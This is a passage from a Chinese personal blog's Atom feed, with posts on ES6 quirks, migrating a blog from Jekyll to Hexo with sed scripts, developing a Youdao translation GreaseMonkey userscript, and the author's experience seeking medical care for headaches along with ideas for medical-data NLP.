<p></p><p style="color:red">PS: 浏览器调试工具会调用一些方法。比如，你新建一个<code>expandedDct</code>之后，如果在firebug中想用<code>.</code>来查看变量，会对其调用很多方法。。。结果就是<code>expandedDct</code>多了很多firebug探查对象属性用到的函数名。。。我在这个问题上纠结了几乎两个小时没明白为啥多了这些奇怪的键而且一会儿有一会儿没。切切注意！！</p><p></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#62; Object.keys(expandedDct)&#10;[&#34;a&#34;, &#34;c&#34;, &#34;length&#34;, &#34;fullPath&#34;, &#34;fileSize&#34;, &#34;header&#34;, &#34;body&#34;, &#34;getSourceLink&#34;]</span><br></pre></td></tr></table></figure>
<h2 id="总结">总结</h2><p>以上，就是最近感觉比较有意思的一些ES6特性，就这样吧。</p>
<p>Have fun！</p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="ES6">ES6</h2><p>ES6标准，也称ES2015。在2015年6月正式批准，这是javascript语言标准从2009年首次大版本更新。</p>
<p>这个版本带来了很多新东西，说是新东西，估计基本读者也都见过。比如python中常用的Destruct]]>
    </summary>
    
      <category term="ES2015" scheme="http://reverland.org/tags/es2015/"/>
    
      <category term="javascript" scheme="http://reverland.org/tags/javascript/"/>
    
      <category term="javascript" scheme="http://reverland.org/categories/javascript/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[从Jekyll迁移到Hexo]]></title>
    <link href="http://reverland.org/web/2015/11/18/notes-on-migrating-from-jeykll-to-hexo/"/>
    <id>http://reverland.org/web/2015/11/18/notes-on-migrating-from-jeykll-to-hexo/</id>
    <published>2015-11-17T16:00:00.000Z</published>
    <updated>2015-11-18T15:23:54.682Z</updated>
    <content type="html"><![CDATA[<p>上周，我将博客从jekyll平台迁移到hexo下。</p>
<h2 id="缘起">缘起</h2><p>不为什么。本来不想换，奈何不能成功在ubuntu 14.10上用rvm成功编译<code>ruby 2.1+</code>，连续几次过热自动关机后，就默默装上了基于node的hexo。</p>
<h2 id="迁移记录">迁移记录</h2><p>对jekyll，日志源文件都在<code>_posts/</code>目录下。而hexo则在<code>sources/_posts/</code>下。两者支持的都是带metadata的markdown文件。(当然，我还有一些用textile标记的文件。)简单来说，只要把相应的markdown文件迁移到hexo对应的位置就行。</p>
<p>但在迁移碰到了几个问题：</p>
<ol>
<li>修正permalink</li>
<li>语法高亮部分修改</li>
<li>特殊字符escape</li>
<li>textile文件</li>
</ol>
<h3 id="与jekyll之前配置一致的url结构和文件命名方式">与jekyll之前配置一致的url结构和文件命名方式</h3><p>以前，我用jeykll时，每个文件名字如下：</p>
<pre><code><span class="number">2012</span>-<span class="number">11</span>-<span class="number">19</span>-<span class="keyword">this</span>-is-a-post.md
</code></pre><p>对应的url为</p>
<pre><code><span class="string">http:</span><span class="comment">//reverland.org/2012/11/19/this-is-a-post/</span>
</code></pre><p>或者可以是</p>
<pre><code><span class="string">http:</span><span class="comment">//reverland.org/2012/11/19/this-is-a-post</span>
<span class="string">http:</span><span class="comment">//reverland.org/2012/11/19/this-is-a-post/index.html</span>
</code></pre><p>首先，要把hexo也改成这样的，在<code>_config.yml</code>中：</p>
<pre><code><span class="symbol">new_post_name:</span> <span class="symbol">:year-</span><span class="symbol">:month-</span><span class="symbol">:day-</span><span class="symbol">:title</span>.md <span class="comment"># File name of new posts</span>
<span class="symbol">permalink:</span> <span class="symbol">:category/</span><span class="symbol">:year/</span><span class="symbol">:month/</span><span class="symbol">:day/</span><span class="symbol">:title/</span>
</code></pre><p>但，还是有问题，具体可以参照<a href="https://github.com/hexojs/hexo/issues/1589" target="_blank" rel="external">我提的issue</a>，hexo如果看你的文件名是这样：</p>
<pre><code><span class="number">2014</span>-<span class="number">06</span>-<span class="number">12</span>-.md
</code></pre><p>会生成这样的url</p>
<pre><code><span class="number">2015</span>/<span class="number">11</span>/<span class="number">13</span>/<span class="number">2014</span>-<span class="number">06</span>-<span class="number">12.</span>html
</code></pre><p>显然这不是我们想要的。</p>
<p>我们通过将<a href="https://github.com/hexojs/hexo-util/blob/cb685f19ecb5ba9ee48109049b21a21cd3da7dee/lib/permalink.js#L28" target="_blank" rel="external"><code>node_modules/hexo-util/lib/permalink.js</code>第28行</a>由</p>
<pre><code><span class="keyword">return</span> <span class="string">'(.+?)'</span>;
</code></pre><p>更改为</p>
<pre><code><span class="keyword">return</span> <span class="string">'(.*?)'</span>;
</code></pre><p>可以实现以前的jekyll风格。</p>
<p>如果你现在用的是hexo版本<code>3.1.0</code>，如果文件是：</p>
<p>可能会遇到生成这种url链接：</p>
<pre><code><span class="label">http:</span>//reverland<span class="preprocessor">.org</span>/<span class="number">2014</span>/<span class="number">06</span>/<span class="number">12</span>//index.html
<span class="label">http:</span>//reverland<span class="preprocessor">.org</span>/<span class="number">2014</span>/<span class="number">06</span>/<span class="number">12</span>//
</code></pre><p>在github中hexo已经不会有这个问题了，可以参见 <a href="https://github.com/hexojs/hexo/blob/d035d19ccd221f6815634c2d6d2aaa59b959839f/lib/plugins/helper/url_for.js#L30" target="_blank" rel="external">hexo/helper/url_for</a>的</p>
<pre><code><span class="function"><span class="keyword">return</span> path.<span class="title">replace</span><span class="params">(/\/{<span class="number">2</span>,}/g, <span class="string">'/'</span>)</span></span>;
</code></pre><p>来进行修改，如果你用的不是git版本的hexo。</p>
<p>我之后还碰到个问题，hexo中的分类是大小写敏感的，jekyll也是，但jekyll在url中会统一变成小写而hexo则不会，这竟然造成了我迁移后的一些链接失效。修正方法也很简单，通过<code>sed</code>将所有大写的<code>category</code>项都替换成对应的小写版本。</p>
<pre><code><span class="title">sed</span> -i <span class="string">'s/^category: Life/category: life/g'</span> source/_posts/<span class="regexp">*.md</span>  <span class="comment"># 我只有Life分类莫名写成了大写</span>
</code></pre><p>这样，确保了和jekyll之前所有链接一致，然而，发现还是有disqus的评论消失了，检查链接并没有差异，暂时不知为什么。如果有谁能指教下请告诉我。</p>
<h3 id="语法高亮修改">语法高亮修改</h3><p>jekyll中，除了我用四个空格作为编码块区域缩进设定，还广泛使用了jekyll所特有的记法进行代码高亮。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% highlight python %&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#123;% endhighlight %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% highlight cl%&#125;</span><br><span class="line">(cdr,</span><br><span class="line">  (add,</span><br><span class="line">    <span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">&#123;% endhighlight %&#125;</span><br></pre></td></tr></table></figure>
<p>另外，我的每个文件里还有些jekyll特定命令来加入统计和评论什么的。这是当年从<a href="http://blog.skydark.info/" target="_blank" rel="external">Skydark</a>那里画虎不成留下的各种dirty　hack的结果。</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% include JB/setup %&#125;</span><br></pre></td></tr></table></figure>
<p>可以这样转换掉</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">'s/&#123;%[[:space:]]highlight[[:space:]]\(.*\)[[:space:]]*%\&#125;/```\1/g'</span> <span class="built_in">source</span>/_posts/*.md  <span class="comment"># 注意有空格和没空格</span></span><br><span class="line">sed -i <span class="string">'s/&#123;%[[:space:]]endhighlight[[:space:]]%\&#125;/```/g'</span> <span class="built_in">source</span>/_posts/*.md</span><br><span class="line">sed -i <span class="string">'s/&#123;%[[:space:]]include JB\/setup[[:space:]]%\&#125;//g source/_posts/*.md'</span></span><br></pre></td></tr></table></figure>
<h3 id="特殊字符escape">特殊字符escape</h3><p>接着有些特殊的文件会解析报错，因为hexo<a href="https://hexo.io/docs/troubleshooting.html#Escape_Contents" target="_blank" rel="external">用nunjunks来渲染</a>，如果文本中有<code>{&#123; }}</code>或者<code>{&#37; %}</code>会出错。我发现如果是缩进四格的代码标记或者<code>&#96;</code>会出错，但如果用另一种标记法<code> &#96;&#96;&#96;</code>则没关系。</p>
<p>实在不行，我们可以用<a href="http://www.ascii.cl/htmlcodes.htm" target="_blank" rel="external">html实体编码</a>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;code&#62;&#38;#97;&#38;#98;&#38;#99;&#60;/code&#62;</span><br></pre></td></tr></table></figure>
<h3 id="textile文件">textile文件</h3><p>我试着用pandoc转换了下，发现几个问题：</p>
<ol>
<li>会将metadata错误地转换</li>
<li>莫名的在行或特殊符号后面加反斜杠</li>
<li>不能很好处理jekyll的代码高亮标记法</li>
</ol>
<p>我写了些脚本辅助手工更改为markdown格式。话说这些sed代码还都是之前尝试往pelican上迁移时写的辅助脚本，虽然从来没有迁移到pelican平台上。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 删除和转换jeykll特定标记</span></span><br><span class="line">sed -i <span class="string">'s/&#123;%[[:space:]]include JB\/setup[[:space:]]%\&#125;//g'</span> <span class="built_in">source</span>/_posts/*.textile</span><br><span class="line">sed -i <span class="string">'s/&#123;%[[:space:]]highlight[[:space:]]\(.*\)[[:space:]]*%\&#125;/```\1/g'</span> <span class="built_in">source</span>/_posts/*.textile</span><br><span class="line">sed -i <span class="string">'s/&#123;%[[:space:]]endhighlight[[:space:]]%\&#125;/```/g'</span> <span class="built_in">source</span>/_posts/*.textile</span><br><span class="line"></span><br><span class="line"><span class="comment"># textile标记到markdown的转换</span></span><br><span class="line"><span class="comment"># 列表</span></span><br><span class="line">sed -i <span class="string">'s/^* /- /g'</span> <span class="built_in">source</span>/_posts/*.textile</span><br><span class="line">sed -i <span class="string">'s/^# /- /g'</span> <span class="built_in">source</span>/_posts/*.textile</span><br><span class="line"><span class="comment"># 标题</span></span><br><span class="line">sed -i <span class="string">'s/^h1./#/g'</span> <span class="built_in">source</span>/_posts/*.textile</span><br><span class="line">sed -i <span class="string">'s/^h2./##/g'</span> <span class="built_in">source</span>/_posts/*.textile</span><br><span class="line">sed -i <span class="string">'s/^h3./###/g'</span> <span class="built_in">source</span>/_posts/*.textile</span><br><span class="line">sed -i <span class="string">'s/^h4./####/g'</span> <span class="built_in">source</span>/_posts/*.textile</span><br><span class="line">sed -i <span class="string">'s/^h5./#####/g'</span> <span class="built_in">source</span>/_posts/*.textile</span><br><span class="line"><span class="comment"># 脚注</span></span><br><span class="line">sed -i <span class="string">'s/^fn\([[:digit:]]\)\./[\^\1]:/g'</span> <span class="built_in">source</span>/*.textile</span><br><span class="line">sed -i <span class="string">'s/\[\([[:digit:]]*\)\]/[\^\1]/g'</span> <span class="built_in">source</span>/*.textile</span><br><span class="line"><span class="comment"># 默认的markdown解析并不支持脚注</span></span><br><span class="line"><span class="comment"># 如果需要，参考这里替换默认markdown解析，https://github.com/celsomiranda/hexo-renderer-markdown-it　</span></span><br><span class="line"><span class="comment"># 可惜这个引擎中，```块就不能正常解析&#123;&#123; &#125;&#125;这种东西了</span></span><br><span class="line"><span class="comment"># 不知道那个pandoc后端的怎样。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 链接</span></span><br><span class="line">sed -i <span class="string">'s/"\([^"]*\)"\([h|\/].*\)/[\1](\2)/g'</span> <span class="built_in">source</span>/*.textile</span><br><span class="line">sed -i <span class="string">'s/"\([^"]*\)"\([^h\/].*\)/[\1][\2]/g'</span> <span class="built_in">source</span>/*.textile</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 最后把后缀改了，hexo不会处理后缀是textile的文件</span></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> <span class="built_in">source</span>/_posts/*.textile; <span class="keyword">do</span></span><br><span class="line">cp <span class="variable">$file</span> <span class="built_in">source</span>/_posts/`basename <span class="variable">$file</span> .textile`.md</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>当然，最好脚本辅助，手工确认。</p>
<p>另外，有这么个东西<a href="https://github.com/wzpan/hexo-renderer-pandoc" target="_blank" rel="external">hexo render pandoc</a>来替换hexo的渲染引擎，就能顺便支持textile。值得一试和研究，也许里头就用到对文档元数据或者跳过指定行数的转换吧。没有细看。话说，还看到<a href="http://codefalling.com/2015/11/15/new-version-of-hexo-renderer-org/" target="_blank" rel="external">@CodeFalling</a>使用emacs来做org渲染后端，hexo的灵活性可见一斑。</p>
<h2 id="feed">feed</h2><p>默认的hexo竟然不像jekyll一样有feed生成支持！不过有<a href="https://github.com/hexojs/hexo-generator-feed" target="_blank" rel="external">hexo-generator-feed</a>这个插件来实现。具体参照文档就好。</p>
<h2 id="添加友情链接、分类页、标签页">添加友情链接、分类页、标签页</h2><p>根据<a href="http://theme-next.iissnan.com/theme-settings.html" target="_blank" rel="external">根据Next主题的文档来就好</a>。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>上周，我将博客从jekyll平台迁移到hexo下。</p>
<h2 id="缘起">缘起</h2><p>不为什么。本来不想换，奈何不能成功在ubuntu 14.10上用rvm成功编译<code>ruby 2.1+</code>，连续几次过热自动关机后，就默默装上了基于nod]]>
    </summary>
    
      <category term="hexo" scheme="http://reverland.org/tags/hexo/"/>
    
      <category term="web" scheme="http://reverland.org/tags/web/"/>
    
      <category term="web" scheme="http://reverland.org/categories/web/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[GreaseMonkey Userscript 开发的难与易]]></title>
    <link href="http://reverland.org/javascript/2015/11/17/greasemonkey-userscript/"/>
    <id>http://reverland.org/javascript/2015/11/17/greasemonkey-userscript/</id>
    <published>2015-11-17T14:21:25.000Z</published>
    <updated>2015-11-17T14:55:28.434Z</updated>
    <content type="html"><![CDATA[<p>这两天，写了一个简单的基于有道在线翻译的GreaseMonkey屏幕取词脚本。</p>
<p><a href="https://greasyfork.org/en/scripts/12758-youdaodict" target="_blank" rel="external">点我查看GreaseFork</a></p>
<p><img src="http://upload-images.jianshu.io/upload_images/927981-c88125ce5a60959a.gif" alt="youdaodict-1.gif"></p>
<p>我想做这件事很久了，从我还不是一个前端开发者的时候，就一直想做这么一个轻量的浏览器脚本，方便自己查看英文的文档和文章。没想到想了这么久，真正没做多久。</p>
<p>作为一个Ubuntu Linux用户，浏览器取词我有几个选择：</p>
<ol>
<li><p>尝试安装有道词典Linux版本、openyoudao或者其他stardict或者goldendict这种本地词典。但我并不觉得我需要桌面软件。</p>
</li>
<li><p>有人做了个Google translate tooltip的GreaseMonkey脚本实现这个，非常棒。但谷歌的服务在国内的服务非常不稳定，取词功能经常不能正常使用。</p>
</li>
<li><p>有道提供了<a href="http://fanyi.youdao.com/web2/?keyfrom=fanyiweb" target="_blank" rel="external">网页翻译2.0</a>，通过书签执行一段代码把取词功能注入当前页面。然而，首先随着浏览器安全特性的加强，该书签不能正常使用，其次每次都要先点书签才能取词(也许是快捷键)。</p>
</li>
</ol>
<h2 id="选择是难">选择是难</h2><p>很多网站，包括cnblog发现都提供了取词版本。我面临的选择是：</p>
<ol>
<li>在这些已有的浏览器取词脚本基础上学习修改。</li>
<li>凭借着自己的感觉从新设计</li>
</ol>
<p>选择上花了很多时间。</p>
<p>方案一的优点有：</p>
<ol>
<li>成熟美观。</li>
<li>能学习到很多东西</li>
</ol>
<p>方案一问题在于：</p>
<ol>
<li>源码难理解。代码量较大，都是压缩甚至混淆变量过的。</li>
<li>有些和当前页面的样式或者脚本搅和在一起。不易分离</li>
<li>被浏览器或网站安全设置废掉，未必能使用</li>
</ol>
<p>终于，由于我的智商被有道在线翻译那个脚本所碾压，我想还是看看功能自己设计下，做个简单版本。</p>
<p>想的很简单</p>
<h2 id="设计是易">设计是易</h2><p>想法很简单。</p>
<ol>
<li>鼠标选词</li>
<li>向第三方发起请求，比如bing的翻译或者有道的</li>
<li>读取返回，弹出tooltip，格式化数据</li>
<li>其他辅助功能比如发音、单词本等等</li>
</ol>
<p>设计是最简单的一环，后面你会看到时间都花到哪里了。</p>
<h2 id="知易行难">知易行难</h2><p>通过谷歌，很容易完成第一步，在脚本中得到选中的文字。</p>
<p>第二步就开始面临问题。作为前信息安全专业从业者，很清楚ajax这种东西跨域是受限制的。稍微翻阅scriptish文档发现GM_xmlhttpRequest可以满足我的需求。</p>
<p>除却和  <code>XMLHttpRequest</code>这种东西并不太一样的api造成的各种细节错误，之后碰到的问题是我整个开发过程最棘手、花费时间最长的问题。</p>
<p>无论onload、onerror还是onreadystate的回调中，<code>GM_log</code>都没有打印出任何信息。</p>
<p>firebug和火狐内置调试器也没有显示任何通信。这和我在网络上看到的GreaseMonkey相关信息并不太相符。</p>
<p>经检查脚本元数据<code>@grant</code>，觉得已经授权这个跨域函数也没什么问题。</p>
<p>折腾一阵，确认API调用和细节都无法确认问题后，采取曲线调试方案。</p>
<p>更改请求地址到本地，确认请求确实发出了。那么，它有返回吗？</p>
<p>在本地用netcat模拟返回数据，仍然没有打印任何信息。我开始怀疑难道GM_xmlhttpRequest是会对返回结果做验证？必须报头正确？</p>
<p>第一天就这么过去了。</p>
<p>第二天我决定尝试代理来看来往的通信是否正常。</p>
<p>方便起见，先用nc充当了下代理，检查了下相互通信，未见有什么不对的。</p>
<p>为严谨起见，用burpsuite来设置一个透明本地代理，让浏览器指向那个代理。经过检验，完全没看出通信有什么问题。但onload和其他回调也不会被触发。</p>
<p>谷歌搜索得到一些stackoverflow、github issue和greasewiki上的信息，但问题仍不能确认和解决。</p>
<p>只是昨天晚上baidu时心心念念，发现firefox贴吧里有人吐槽scriptish不稳定的一些地方，今天又看到一些讨论，决定换回GreaseMonkey试试，事实证明这是明智的。</p>
<p>然而，一换发现什么都打印不出来了。后来反复尝试，发现GM_log不能用，我简直震惊了，wiki上写着玩的么，还是有什么变化。反正我发现console.log可以使用，那就继续开发下去了。</p>
<p>最难的部分就这么糊里糊涂过去了。</p>
<h2 id="数据请求顺风顺水">数据请求顺风顺水</h2><p>一旦请求完成，解析json数据，按需展示就是水到渠成的事情。</p>
<p>然而，并不是那么简单。</p>
<h2 id="JS异步与回调之难">JS异步与回调之难</h2><p>JS的异步特性带来了这些不符合人类直观思维方式的流程控制风格。</p>
<p>按理说我应该很习惯javascript的异步操作流程控制的种种问题，但还是踩了次坑。</p>
<p>弹出和渲染tooltip的函数没有读到返回数据！</p>
<p>好在对javascript程序员debug这种问题比之前的问题简单太多。一看想起来GM_xmlhttpRequest是异步过程，而不是同步，我这里却要待异步过程返回结果再执行下一个函数。</p>
<p>想想promise应该不用，虽然firefox41肯定原生支持ES6 promise了。但，就这点函数干脆。。。还是回调“地狱”吧。</p>
<h2 id="JS难中有易">JS难中有易</h2><p>说到ES6，ES6提供了很多方便javascript编程的好东西，通过<code>let</code>和<code>=&gt;</code>实现更好的this和作用域一致，通过<code>Template</code>方便字符串操作等等。</p>
<p>很庆幸，GreaseMonkey的话我只考虑firefox用户，反正好早的时候这些ES6特性浏览器都支持了。</p>
<h2 id="JS易中又难">JS易中又难</h2><p>JS让人非常难过的一个地方，是DOM操作和各种webAPI。只能说丧心病狂。你记得清楚如何获得viewport区域大小么？知道如何获得鼠标相对viewport位置么？知道为啥获取区域高度或宽度并没有获得么？看到clientWidth、offsetWidth、availWidth…有没有想砍人？</p>
<p>为了让脚本能正确在屏幕边缘让tooltip出现在viewport内，在各种边界条件数学计算题这里又纠结了好久。</p>
<p>GreaseMonkey相比Scriptish少了一个比较方便的特性： <code>@css</code>。虽然可以在head标签中通过<code>GM_addStyle()</code>来注入样式，我总觉得会不合时宜的覆盖不该覆盖的东西，我对Google Translate Tooltip在阮一峰大大的网站上奇葩的样式表现印象深刻。所以，还是选择在DOM中注入的样式。</p>
<p>这是体力活，你说体力活难不难呢？</p>
<h2 id="最难的部分">最难的部分</h2><p>安全是最难以面对的一个问题。之所以，很多标签、脚本在页面上失效，都是由于近年来浏览器越来越严格的安全策略。我在开发这个脚本时碰到了两点：</p>
<ol>
<li>在https网站页面中无法加载http的资源。在调试工具中可以看到<a href="https://developer.mozilla.org/en/docs/Security/MixedContent" target="_blank" rel="external">mixed content</a>的字样。</li>
<li>如果网站报头中有CSP限制。调试工具中也能看到提示。</li>
</ol>
<p>问题一，可以通过GM_xmlhttpRequest方法实现混合协议内容，如果外部资源也支持https请求也行。当我开发发音功能时就发现有道的语音api可以用https访问。</p>
<p>问题二，只能通过各种CORS技术实现(参见附录)。<del>我还没开始做。</del>但看到<a href="http://stackoverflow.com/questions/28554022/how-can-i-play-sound-with-a-greasemonkey-script-in-firefox-when-theres-a-conte" target="_blank" rel="external">Stackoverflow上有个示例</a></p>
<blockquote>
<p>你确定要通过打开<code>about:config</code>禁用firefox对CSP的支持吗？</p>
</blockquote>
<p>不！！</p>
<p>通过<code>GM_xmlhttpRequest</code>完成异步请求，将数据用浏览器播放出来实现跨域资源引用。这样，在一定程度上并不降低浏览器安全性，却能够实现需求，完成功能。</p>
<p>Cheers！</p>
<h2 id="附录">附录</h2><ul>
<li><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=866522" target="_blank" rel="external">https://bugzilla.mozilla.org/show_bug.cgi?id=866522</a></li>
<li><a href="https://github.com/greasemonkey/greasemonkey/issues/2046" target="_blank" rel="external">https://github.com/greasemonkey/greasemonkey/issues/2046</a></li>
<li><a href="http://forums.mozillazine.org/viewtopic.php?f=38&amp;t=2958293" target="_blank" rel="external">http://forums.mozillazine.org/viewtopic.php?f=38&amp;t=2958293</a></li>
<li><a href="http://stackoverflow.com/questions/28554022/how-can-i-play-sound-with-a-greasemonkey-script-in-firefox-when-theres-a-conte" target="_blank" rel="external">http://stackoverflow.com/questions/28554022/how-can-i-play-sound-with-a-greasemonkey-script-in-firefox-when-theres-a-conte</a></li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<p>这两天，写了一个简单的基于有道在线翻译的GreaseMonkey屏幕取词脚本。</p>
<p><a href="https://greasyfork.org/en/scripts/12758-youdaodict" target="_blank" rel="external]]>
    </summary>
    
      <category term="javascript" scheme="http://reverland.org/tags/javascript/"/>
    
      <category term="javascript" scheme="http://reverland.org/categories/javascript/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[我回来了]]></title>
    <link href="http://reverland.org/life/2015/11/12/i-am-back/"/>
    <id>http://reverland.org/life/2015/11/12/i-am-back/</id>
    <published>2015-11-11T16:00:00.000Z</published>
    <updated>2015-11-18T10:18:25.431Z</updated>
    <content type="html"><![CDATA[<h2 id="看病与思考">看病与思考</h2><p>昨日，很遗憾听说一个朋友的兄弟在出车祸之后一个月后，终于还是走了。生死去来，棚头傀儡，一线断时，落落磊磊。</p>
<p>前几个月，我也很难过，一度不知道面对的是什么。我想说说看病的经历。</p>
<p>症状是头疼，疼得特别厉害，晚上睡不着、或者睡着了半夜疼醒。眼眶下边，有时候太阳穴上头，耳朵旁边都会疼。</p>
<p>总共去北邮社区医院耳鼻喉、口腔，北医三院耳鼻喉、神经内科(头疼专科)，某市中心医院耳鼻喉科、神经内科、眼科，北京协和医院神经内科、耳鼻喉科、口腔科，一直到最后把牙拔掉，终于头疼停歇了。</p>
<p>我想重点说说感受</p>
<ol>
<li><p>医生的经验往往是领域内，有更好的判断力。比如神经内科的专家告诉我，你这个比较奇怪，一般我们只考虑头部而不是面部的疼痛。而且头疼的原因很复杂，百分之八十根本找不出原因。再比如耳鼻喉的专家告诉我，你这个鼻窦囊肿根本没什么事，建议去神经科检查。再比如头疼专科专家做了一系列排除后让我复查鼻窦CT，如果发现问题还是去耳鼻喉。比如我怀疑牙齿或周边问题，可是非口腔科医生一个没看出问题，还有似乎没看清还带手套摸了下说没问题的社区医院口腔科医生。</p>
</li>
<li><p>症状关联还是要靠自己。要清晰记录、准确描述自身症状。我一路看下去，各科医生也不能确保问题在哪里，倒是自己去问，会不会因为牙齿的问题造成的囊肿，要不要还看下口腔科。后来发现疼痛发作时间和牙疼的规律有些相像，另外就是有时候刷牙或者漱口会造成头猛地一疼。后来一天刷四次牙竟然不怎么疼了更让我怀疑。。。</p>
</li>
<li><p>看病不容易，挂号难，等了一周可能就看那么一会儿。检查有可能也要预约，做完检查还要等取结果。等啊等。。。</p>
</li>
</ol>
<h3 id="反馈">反馈</h3><p>在北京看病是一个很长的周期，特别是疾病很难在某个领域内精确诊断时，往往都是在各大医院辗转求医。去协和头疼专科的时候，一个阿姨给我展示她的病历，厚厚的一本上写满了在各大医院的辗转的诊断、治疗信息。时间跨度长达数年，病情反反复复，原因则不明。一方面，零散在各地的医院积累了大量的诊断信息、治疗信息。另一方面，医生一般很难收到门诊病人的反馈。</p>
<p>好在有很多医生在病房。然而，反馈真是个很重要的东西。可惜我最后去拔了牙，之前的所有的医生都不会得到反馈这个症状可能和牙有关系，估计他们忙碌接待了成百上千各式各样的人，也不会记得某些——特例吧。</p>
<p>反馈很重要。北医三院神经科专家李坚当时对我的症状把边边角角都想了想，最后推荐去宣武医院一位医生那里看看去排除下极度罕见的特例。因为他的一位患者曾经给过他反馈，他印象比较深刻。</p>
<p>我校医院口腔科医生现在都不知道我智齿蛀牙这么厉害，但我也不可能跑回去跟她说当时你没看清、也没摸出来，智齿其实缺了一块。。。</p>
<p>我想，也许只是个美好的远景，商业大数据不应该仅仅应用到娱乐和消费之上，更多的应该能服务于我们生活的基础、生活的方方面面。希望互联网能促进传统医疗行业的数字化和高度整合，基于数据驱动开创新的医疗模式。这对参与者是商机，也是降低整个医疗成本的关键。</p>
<p>目前就自己搜集资料和使用的体验上来看，好大夫是首屈一指的高质量医患交流平台、春雨医生也还不错，可能主要移动端的不怎么能靠搜索引擎检索到，但响应速度挺快。<br>丁香园平台内容据说很优质，可惜搜索引擎也检索不到相关信息，需要注册登录。</p>
<h3 id="愿景">愿景</h3><p>个人希望将来的医疗信息平台是：</p>
<ol>
<li>基本开放的。可以通过搜索引擎高效检索，而不是在信息上设置层层权限和障碍。这一点，非常喜欢好大夫，有些权限控制来保护患者隐私，但其他信息一般不会不可见。医生有时候也会发些不错的科普文哈哈。</li>
<li>高质量的。有专业的医生和认真对待自己病情的患者。有热衷分享和共同创造价值的开放社区。社区对品质和贡献有追求。有些网站的质量简直不忍直视，一看都是复制粘贴。</li>
<li>数据驱动的。不知道该不该寄希望于那些赚得钵满盆满，牛逼吹得天花乱坠，在推动娱乐文化和消费狂潮上无所不用其及的互联网企业们。商机和风险必然是相伴而生，目前看，医疗相关的互联网企业似乎还是需要偏运营更多才能勉强生存。O2O才是各个企业的重点。行业达到了一定的原始数据和资金积累之后，应该会有更多技术上追寻进步的力量去改善整个医疗行业的未来吧。</li>
</ol>
<h3 id="关联分析">关联分析</h3><p>当时，头疼找不出原因的时候。开始记录疼痛和生活点滴做关联。事实上，源于早前在<a href="http://eloquentjavascript.net/04_data.html" target="_blank" rel="external">Eloquent Javascript中的有趣例子</a>。</p>
<p>之后，一直想做这些吧，一是一直对关联挖掘算法、NLP、机器学习的东西念念不忘。总觉得可以做点什么，能让疾病诊断这方面有点突破和改变。</p>
<p>可是，我个人的数据量小。这时候就发现好大夫这个网站用来做数据源是可能的。有次和周老板(话说，周老板他们和丁香园那边的冯某某都认识。。。)讨论百度口碑和淘宝大家印象的实现时，开始考虑来对医生、患者提问信息条目等等里头做主题分类一类的事情。大概想了下相关技术。</p>
<h4 id="数据获取">数据获取</h4><ol>
<li>数据的获取。爬虫自不用说，一般没有写不出的爬虫。基本上、Python和Nodejs都写过，觉得Python工具栈更全面成熟。效率我会考虑twisted而不是gevent，那个内存占用太吓人。</li>
<li>数据的清理。这是体力活。</li>
</ol>
<h4 id="NLP">NLP</h4><p>自然语言处理、主题模型等等。常用算法、模块基本都没问题。最最关键的是、做中文的时候， 特别是特定领域中文自然语言处理的时候，如果想在效率上提升、词典很重要。我大概看了下Matrix67当年关于分词发现的那篇博客，又对照了下某人的新词发现硕士论文。看了看HanLP和jieba分词的原理，瞄了瞄HMM和CRF分词的思想。最后自己实现了下Matrix67的算法玩(你敢信是用nodejs，结果后来RedHat的Bruno问，What do you do with Nodjs? 我说。。。String Manipulation…)。</p>
